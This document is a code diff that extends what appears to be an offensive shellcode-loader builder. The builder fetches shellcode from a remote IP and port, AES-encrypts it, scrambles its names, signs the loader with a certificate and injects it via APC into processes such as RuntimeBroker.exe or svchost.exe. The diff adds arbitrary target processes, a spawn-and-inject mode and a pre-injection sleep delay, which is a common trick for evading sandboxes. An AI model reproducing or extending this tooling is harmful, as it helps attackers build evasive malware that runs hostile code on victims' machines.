@@ -23,7 +23,7 @@ def main():
 
     parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
     parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
-    parser_staged.add_argument("-apc", "--apc", help="Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe", choices=["RuntimeBroker.exe", "svchost.exe"], default="RuntimeBroker.exe")
+    parser_staged.add_argument("-apc", "--apc", type=str, default="RuntimeBroker.exe", help="Target process name for APC injection (e.g., explorer.exe).")
 
     parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address from where your shellcode is gonna be fetched.", required=True)
     parser_staged.add_argument("-po", "--port", type=int, help="Port from where the HTTP connection is gonna fetch your shellcode.", required=True)
@@ -34,18 +34,24 @@ def main():
     parser_staged.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
     parser_staged.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
     parser_staged.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
+    parser_staged.add_argument("--delay", type=int, default=0, help="Delay in seconds before injection (default 0).")
+    parser_staged.add_argument("--spawn", action="store_true", help="Spawn a new process for injection (e.g., notepad.exe)")
+    parser_staged.add_argument("--spawn-path", type=str, default="C:\\Windows\\System32\\notepad.exe", help="Path to the executable to spawn for injection.")
 
     parser_staged.epilog = "Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s -pfx cert.pfx -pfx-pass 'password'"
 
     parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
     parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
-    parser_stageless.add_argument("-apc", "--apc", help="Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe", choices=["RuntimeBroker.exe", "svchost.exe"], default="RuntimeBroker.exe")
+    parser_stageless.add_argument("-apc", "--apc", type=str, default="RuntimeBroker.exe", help="Target process name for APC injection (e.g., explorer.exe).")
     
     parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
     parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
     parser_stageless.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
     parser_stageless.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
     parser_stageless.add_argument("-o", "--output", type=str, help="Output name for the generated loader (without extension).")
+    parser_stageless.add_argument("--delay", type=int, default=0, help="Delay in seconds before injection (default 0).")
+    parser_stageless.add_argument("--spawn", action="store_true", help="Spawn a new process for injection (e.g., notepad.exe)")
+    parser_stageless.add_argument("--spawn-path", type=str, default="C:\\Windows\\System32\\notepad.exe", help="Path to the executable to spawn for injection.")
 
     parser_stageless.epilog = "Example usage: python main.py stageless -p shellcode.bin -e -s -pfx cert.pfx -pfx-pass 'password'"
 
@@ -136,7 +142,19 @@ def main():
                         file.writelines(data)
 
             print(Colors.green("[+] Template files modified !"))
-            
+
+                        # --- Spawn new process injection ---
+            if args.spawn:
+                for filename in os.listdir(dst_directory):
+                    if filename.endswith(".c") or filename.endswith(".h"):
+                        with open(f"{dst_directory}/{filename}", "r") as f:
+                            content = f.read()
+                        # Replace the placeholder with a macro that enables the spawn code
+                        content = content.replace("//#-SPAWN-#", "#define USE_SPAWN")
+                        with open(f"{dst_directory}/{filename}", "w") as f:
+                            f.write(content)
+                print(Colors.green("[+] Spawn injection mode enabled."))
+
             print(Colors.light_yellow("[+] Setting APC injection target process..."))
             if args.format is None or args.format == "EXE":
                 with open(f'{dst_directory}/main.c', 'r') as file:
@@ -159,6 +177,25 @@ def main():
                     file.writelines(main_data)
 
             print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))
+
+            # --- Add delay if specified ---
+            if args.delay > 0:
+                delay_ms = args.delay * 1000
+                for filename in os.listdir(dst_directory):
+                    if filename.startswith("main") and filename.endswith(".c"):
+                        main_c_path = os.path.join(dst_directory, filename)
+                        with open(main_c_path, "r") as f:
+                            lines = f.readlines()
+                        # Find the line that calls APCInjection and insert Sleep before it
+                        for i, line in enumerate(lines):
+                            if "APCInjection(" in line:
+                                # Insert Sleep with appropriate indentation
+                                indent = line[:len(line)-len(line.lstrip())]
+                                lines.insert(i, f"{indent}Sleep({delay_ms});\n")
+                                break
+                        with open(main_c_path, "w") as f:
+                            f.writelines(lines)
+                print(Colors.green(f"[+] Added delay of {args.delay} seconds before injection."))
 
             if args.encrypt:
 
@@ -473,6 +510,18 @@ def main():
 
             print(Colors.green("[+] Template files modified !"))
 
+                        # --- Spawn new process injection ---
+            if args.spawn:
+                for filename in os.listdir(dst_directory):
+                    if filename.endswith(".c") or filename.endswith(".h"):
+                        with open(f"{dst_directory}/{filename}", "r") as f:
+                            content = f.read()
+                        # Replace the placeholder with a macro that enables the spawn code
+                        content = content.replace("//#-SPAWN-#", "#define USE_SPAWN")
+                        with open(f"{dst_directory}/{filename}", "w") as f:
+                            f.write(content)
+                print(Colors.green("[+] Spawn injection mode enabled."))
+
             print(Colors.light_yellow("[+] Setting APC injection target process..."))
             if args.format is None or args.format == "EXE":
                 with open(f'{dst_directory}/main.c', 'r') as file:
@@ -522,6 +571,26 @@ def main():
                             file.writelines(main_data)
 
                 print(Colors.green(f"[+] Payload encrypted and saved into payload[] variable in main.c !"))
+
+            # --- Add delay if specified ---
+            if args.delay > 0:
+                delay_ms = args.delay * 1000
+                for filename in os.listdir(dst_directory):
+                    if filename.startswith("main") and filename.endswith(".c"):
+                        main_c_path = os.path.join(dst_directory, filename)
+                        with open(main_c_path, "r") as f:
+                            lines = f.readlines()
+                        # Find the line that calls APCInjection and insert Sleep before it
+                        for i, line in enumerate(lines):
+                            if "APCInjection(" in line:
+                                # Insert Sleep with appropriate indentation
+                                indent = line[:len(line)-len(line.lstrip())]
+                                lines.insert(i, f"{indent}Sleep({delay_ms});\n")
+                                break
+                        with open(main_c_path, "w") as f:
+                            f.writelines(lines)
+                print(Colors.green(f"[+] Added delay of {args.delay} seconds before injection."))
+
 
             if args.encrypt is False:
 
